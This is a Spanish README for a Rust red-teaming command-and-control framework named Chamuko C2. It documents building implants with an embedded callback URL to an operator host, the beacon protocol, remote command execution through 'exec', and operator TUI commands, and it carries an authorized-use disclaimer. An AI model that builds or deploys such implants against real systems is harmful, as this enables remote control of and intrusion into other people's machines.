# Chamuko C2

Framework de red teaming multi-plataforma escrito en Rust. Incluye un agente (implant), un servidor C2 con interfaz de terminal estilo Havoc en rojo y negro, y un builder para generar agentes con la configuración embebida.

> **Aviso:** Esta herramienta está diseñada exclusivamente para pruebas de penetración autorizadas, ejercicios de red teaming y entornos de laboratorio. El uso no autorizado en sistemas de terceros es ilegal.

## Características

- **Agente multi-plataforma:** Linux, Windows y macOS (sin dependencias del sistema).
- **Comunicación HTTP(S):** registro, beacon con sleep + jitter, envío de tareas y resultados.
- **Sistema de plugins:** los comandos se implementan como plugins estáticos; el `PluginRegistry` enruta cada tarea al primer plugin que la soporta.
- **Comandos built-in:** `exec`, `info`, `whoami`, `hostname`, `pwd`, `ls`, `cd`, `help`.
- **Interfaz TUI rojo/negro estilo Havoc:** lista de agentes, consola por agente, barra de comandos, historial con flechas.
- **Builder:** compila un binario de agente con URL, sleep, jitter y nombre embebidos en tiempo de compilación. Soporta cross-compilación (ej. Windows desde Linux).
- **API HTTP:** `/register`, `/beacon`, `/results`, `/enqueue`, `/agents`, `/health` — integrable con otros clientes.

## Arquitectura

```
chamuko/
├── crates/
│   ├── plugin-api/   Trait Plugin, LifecycleEvent, CommandOutput
│   ├── core/         PluginRegistry: registro, dispatch y routing de comandos
│   ├── protocol/     Tipos compartidos agente↔C2 (JSON)
│   ├── agent/        Cliente C2 + loop de beacon + plugin de comandos
│   ├── c2/           Servidor HTTP + TUI (ratatui/crossterm)
│   └── builder/      Genera binarios de agente con config embebida
└── Cargo.toml        Workspace + perfil release (LTO, strip, panic=abort)
```

### Flujo de comunicación

```
Agente                          C2
  |  POST /register  ----------->  asigna ID + sleep/jitter
  |  <----------- {id, sleep, jitter}
  |
  |  (sleep + jitter)
  |  POST /beacon {id}  -------->  devuelve tareas pendientes
  |  <----------- {tasks: [...]}
  |
  |  ejecuta cada tarea vía plugins
  |  POST /results {id, results} ->  almacena y muestra en consola
  |
  |  repite
```

## Requisitos

- Rust 1.85+ (probado con 1.92)
- Para cross-compilar a Windows: `rustup target add x86_64-pc-windows-gnu` (y `mingw-w64` en Linux)

## Compilación

```bash
# Todo el workspace
cargo build --workspace

# Release (agente pequeño: LTO, strip, panic=abort)
cargo build --release -p chamuko-agent
cargo build --release -p chamuko-c2
cargo build --release -p chamuko-builder
```

## Uso

### 1. Levantar el C2

```bash
# Con interfaz TUI (rojo/negro)
cargo run -p chamuko-c2 -- --port 8080

# En modo headless (sin TUI, para servidores o testing)
cargo run -p chamuko-c2 -- --port 8080 --headless
```

Opciones: `--listen <addr>` (ej. `0.0.0.0:8080`), `--port <port>`, `--headless`.

### 2. Generar un agente con el builder

```bash
# Agente Linux/macOS
cargo run -p chamuko-builder -- \
  --url http://TU_IP:8080 \
  --sleep 10 \
  --jitter 3 \
  --name oficina-finanzas \
  --output ./agent

# Agente Windows (cross-compile desde Linux)
cargo run -p chamuko-builder -- \
  --url http://TU_IP:8080 \
  --target x86_64-pc-windows-gnu \
  --output ./agent.exe
```

El builder embebe `CHAMUKO_C2_URL`, `CHAMUKO_SLEEP`, `CHAMUKO_JITTER` y `CHAMUKO_NAME` en el binario mediante `option_env!`. El agente también acepta flags en tiempo de ejecución que sobrescriben los valores embebidos (`--url`, `--sleep`, `--jitter`, `--name`, `--once`).

### 3. Ejecutar el agente

```bash
./agent                       # usa la config embebida
./agent --once                # un solo beacon y sale (útil para pruebas)
./agent --url http://OTRO_C2:9090  # sobrescribe la URL embebida
```

### 4. Operar desde la TUI

En la interfaz del C2:

| Comando | Descripción |
|---------|-------------|
| `list` | Listar agentes conectados |
| `use <id>` | Seleccionar un agente |
| `exec <cmd> [args...]` | Ejecutar comando del sistema en el agente |
| `info` | Info del host |
| `whoami` | Usuario actual |
| `hostname` | Nombre del host |
| `pwd` | Directorio actual |
| `ls [dir]` | Listar directorio |
| `cd <dir>` | Cambiar directorio |
| `sleep <s>` | Cambiar sleep del agente |
| `jitter <s>` | Cambiar jitter del agente |
| `clear` | Reiniciar scroll de la consola |
| `help` | Ayuda |
| `quit` / `Ctrl+C` | Salir |

Atajos de teclado: `←/→` o `Tab` cambian de agente, `↑/↓` navegan el historial de comandos, `Shift+↑/↓` hacen scroll en la consola.

## API HTTP

| Método | Ruta | Descripción |
|--------|------|-------------|
| POST | `/register` | Registra un agente, devuelve `{id, sleep, jitter}` |
| POST | `/beacon` | El agente pide tareas: `{id}` → `{tasks: [...]}` |
| POST | `/results` | El agente envía resultados: `{id, results: [...]}` |
| POST | `/enqueue` | Encola una tarea: `{id, command, args}` → `{task_id}` |
| GET | `/agents` | Lista de agentes con estado |
| GET | `/health` | Health check |

Ejemplo con curl:

```bash
# Encolar una tarea
curl -X POST http://127.0.0.1:8080/enqueue \
  -H 'Content-Type: application/json' \
  -d '{"id":"chamuko-0001","command":"exec","args":["whoami"]}'
```

## Multi-plataforma

El agente usa APIs estándar de Rust (`std::process`, `std::fs`, `std::env`) y compila nativamente para:

- `x86_64-unknown-linux-gnu`
- `x86_64-pc-windows-gnu` / `x86_64-pc-windows-msvc`
- `x86_64-apple-darwin` / `aarch64-apple-darwin`

Diferencias manejadas automáticamente:
- **Variables de entorno:** `HOSTNAME`/`COMPUTERNAME`, `USER`/`USERNAME`.
- **Shell:** en Windows los comandos `exec` corren vía `cmd /C`; en Unix se ejecutan directamente.
- **Rutas:** `cd` reconoce letras de unidad (`C:\`) en Windows y rutas absolutas en Unix.
- **Extensiones:** el builder añade `.exe` automáticamente para targets de Windows.

## Tests

```bash
cargo test --workspace
```

## Licencia

Uso educativo y de red teaming autorizado. Sin garantías.
